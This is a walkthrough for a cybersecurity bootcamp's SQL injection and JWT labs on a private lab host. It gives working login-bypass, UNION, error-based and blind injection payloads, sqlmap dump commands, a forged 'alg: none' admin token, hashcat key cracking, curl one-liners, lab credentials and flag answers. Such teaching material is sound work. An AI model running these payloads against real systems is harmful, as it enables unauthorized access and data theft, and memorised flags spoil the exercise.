# SQL Injection & JWT Labs Walkthrough

> **Lab URL:** http://10.10.61.221
> **Last Verified:** March 2026

---

## SQL Injection Labs

### Employee Login - Login Bypass (`/resources/login.php`)

**Objective:** Bypass authentication without knowing the password

**Test Steps:**
1. Go to http://10.10.61.221/resources/login.php
2. Enter username: `admin'-- -`
3. Enter any password: `x`
4. Click Login

**Expected Result:** "Login Successful - Welcome, admin!"

**Why it works:** The query becomes:
```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='x'
```
Everything after `--` is a comment, so password check is ignored.

---

### Member Directory - UNION Injection (`/resources/directory.php`)

**Objective:** Extract data from `secret_data` table

**Test Steps:**
1. Go to http://10.10.61.221/resources/directory.php
2. Enter ID: `0 UNION SELECT 1,data_type,data_value,4 FROM secret_data`
3. Click Search

**Expected Result:** Shows secret data including:
| Data Type | Value |
|-----------|-------|
| admin_pin | `1337` |
| api_key | `sk_live_abc123xyz789` |
| db_password | `sup3rs3cr3tDBp@ss` |
| encryption_key | `AES256_K3Y_2026!` |

**Payload Explanation:**
- `0` - Returns no valid member (so UNION results show)
- `UNION SELECT 1,data_type,data_value,4` - Matches 4 columns of members table
- `FROM secret_data` - Target table with sensitive information

---

### Book Catalog - Error-Based Injection (`/resources/catalog.php`)

**Objective:** Extract data using error-based SQL injection with `extractvalue()`

**Test Steps:**
1. Go to http://10.10.61.221/resources/catalog.php
2. Enter bookID: `1` (normal query works, shows "Clean Code")
3. Enter bookID: `1' AND extractvalue(rand(),concat(0x3a,version())) -- -`

**Expected Result:** Shows XPATH syntax error with MySQL version:
```
XPATH syntax error: ':8.0.45'
```

**Extract Secret Data:**
```
1' AND extractvalue(rand(),concat(0x3a,(SELECT data_value FROM secret_data WHERE data_type='admin_pin'))) -- -
```
**Result:** `XPATH syntax error: ':1337'`

**Why it works:** The `extractvalue()` function throws an error containing the extracted data.

---

### Partner Verification - Blind SQL Injection (`/resources/verify.php`)

**Objective:** Extract data using boolean-based blind injection

**Test Steps:**
1. Go to http://10.10.61.221/resources/verify.php
2. Enter code: `LOC001` → Shows "Partner Verified" ✓
3. Enter code: `INVALID` → Shows "Partner Not Found" ✗
4. Enter code: `LOC001' AND '1'='1` → Shows "Partner Verified" (TRUE)
5. Enter code: `LOC001' AND '1'='2` → Shows "Partner Not Found" (FALSE)

**Expected Result:** Different responses for TRUE vs FALSE conditions

**Advanced - Extract secret_key character by character:**
```
LOC001' AND SUBSTRING(secret_key,1,1)='s
```
If "Partner Verified" → first character is 's'

**Partner Table Secrets:**
| Partner Code | Secret Key |
|--------------|------------|
| LOC001 | `s3cr3tP@ss` |
| LOC002 | `p@ssw0rd123` |
| LOC003 | `cl0udK3y!` |

---

### Library Books - SQLMap Practice (`/resources/books.php`)

**Objective:** Use SQLMap to automate extraction

**Manual Test Steps:**
1. Go to http://10.10.61.221/resources/books.php
2. Enter ID: `1` → Shows "Clean Code" book
3. Enter ID: `1 UNION SELECT 1,2,3,4,5,6` → Shows numbers in output

**SQLMap Commands:**
```bash
# Discover databases
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" --dbs

# List tables in leaguesofcode_db
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" -D leaguesofcode_db --tables

# Dump secret_data table
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" -D leaguesofcode_db -T secret_data --dump
```

---

## JWT Labs (`/account/`)

### Step 1: Login with Normal User

1. Go to http://10.10.61.221/account/signin.php
2. Login with credentials:
   - Username: `john`
   - Password: `password123`
3. You'll see a JWT token displayed on success

**Test Accounts:**
| Username | Password | Role |
|----------|----------|------|
| john | password123 | user |
| wiener | peter | user |
| admin | admin | administrator |

---

### Step 2: Examine the JWT

1. Copy the JWT token from the success page
2. Go to https://jwt.io
3. Paste the token in the "Encoded" field

**Decoded Payload:**
```json
{
  "sub": 2,
  "user": "john",
  "role": "user",
  "email": "john@leaguesofcode.com",
  "secret_message": "Standard user account - limited access",
  "iat": 1772784067,
  "exp": 1772787667
}
```

**JWT Structure:**
- Header: `{"alg": "HS256", "typ": "JWT"}`
- Payload: Contains user info and **role: "user"**
- Signature: HMAC-SHA256 with secret

---

### Step 3: Discover the Vulnerability

The dashboard at `/account/portal.php` **does NOT verify the JWT signature**. It only decodes the payload. This means we can tamper with the token!

**Vulnerability:** Missing signature verification

---

### Step 4: Tamper the JWT

**Method: Algorithm "none" Attack**

1. Create new header (algorithm = none):
```json
{"alg": "none", "typ": "JWT"}
```
Base64: `eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0`

2. Create new payload (role = administrator):
```json
{"sub": 2, "user": "john", "role": "administrator", "email": "john@example.com"}
```
Base64: `eyJzdWIiOiAyLCAidXNlciI6ICJqb2huIiwgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICJlbWFpbCI6ICJqb2huQGV4YW1wbGUuY29tIn0`

3. Combine with empty signature:
```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAidXNlciI6ICJqb2huIiwgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICJlbWFpbCI6ICJqb2huQGV4YW1wbGUuY29tIn0.
```

---

### Step 5: Access Admin Panel

1. Open browser DevTools (F12)
2. Go to **Application** → **Cookies** → `http://10.10.61.221`
3. Find `auth_token` cookie
4. Replace value with tampered token:
```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAidXNlciI6ICJqb2huIiwgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICJlbWFpbCI6ICJqb2huQGV4YW1wbGUuY29tIn0.
```
5. Refresh http://10.10.61.221/account/portal.php

**Expected Result:**
- Badge changes from blue "user" to gold "administrator"
- **Admin Panel** section appears with:
  - "Welcome, Administrator!"
  - Total Users: 156
  - Active Sessions: 23
  - **Server Key: `MASTER_KEY_2026`** ← This is the flag!

---

## JWT Weak Key Challenge (`/account/secure.php`)

### Objective
Crack the weak JWT signing key using hashcat

### Steps:
1. Go to http://10.10.61.221/account/secure.php
2. Login with `john / password123`
3. Copy the JWT token
4. Use hashcat to crack the key:
```bash
hashcat -a 0 -m 16500 <JWT_TOKEN> /path/to/wordlist.txt
```
5. The key is `secret1` (found in common wordlists)
6. Forge an admin token signed with `secret1`
7. Access http://10.10.61.221/account/admin.php

**Flag:** `JWT_WEAK_KEY_CRACKED_2026`

---

## Quick Verification Commands

Run these from terminal to verify labs are working:

```bash
# Login bypass
curl -s 'http://10.10.61.221/resources/login.php' \
  -d "username=admin'-- -&password=x" | grep "Welcome"

# UNION - Extract secrets
curl -s 'http://10.10.61.221/resources/directory.php?id=0%20UNION%20SELECT%201,data_type,data_value,4%20FROM%20secret_data'

# Error-based - extractvalue()
curl -s 'http://10.10.61.221/resources/catalog.php?bookID=1%27%20AND%20extractvalue(rand(),concat(0x3a,version()))%20--%20-'

# Blind injection TRUE
curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='1" | grep "Verified"

# Blind injection FALSE
curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='2" | grep "Not Found"

# JWT - Admin access with tampered token
curl -s 'http://10.10.61.221/account/portal.php' \
  -b 'auth_token=eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAidXNlciI6ICJqb2huIiwgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICJlbWFpbCI6ICJqb2huQGV4YW1wbGUuY29tIn0.' \
  | grep "Admin Panel"
```

---

## Summary of Flags/Secrets

| Lab | Secret to Extract |
|-----|-------------------|
| Employee Login | Bypass login as `admin` |
| Member Directory | `admin_pin: 1337`, `api_key: sk_live_abc123xyz789`, `db_password: sup3rs3cr3tDBp@ss` |
| Book Catalog | Extract data via `extractvalue()` errors |
| Partner Verification | Partner secret keys: `s3cr3tP@ss`, `p@ssw0rd123`, `cl0udK3y!` |
| Library Books | All tables via SQLMap |
| JWT (None Algorithm) | Server Key: **`MASTER_KEY_2026`** |
| JWT (Weak Key) | Flag: **`JWT_WEAK_KEY_CRACKED_2026`** |

---

## Troubleshooting

**Lab not loading?**
```bash
# Check if containers are running
ssh -J root-agent@100.107.182.15 loc@10.10.61.221 "docker ps"

# Restart all services
ssh -J root-agent@100.107.182.15 loc@10.10.61.221 "cd /home/loc/HackdayBc && docker-compose restart"
```

**JWT cookie not saving?**
- Make sure you're on the same domain (10.10.61.221)
- Check DevTools Console for errors
- Try incognito/private browsing mode

**SQL injection not working?**
- Check for typos in payloads
- Try URL encoding special characters: `'` = `%27`, space = `%20`
- Use browser DevTools Network tab to see actual requests

---

*Created for LeaguesOfCode Cybersecurity Bootcamp 2026*
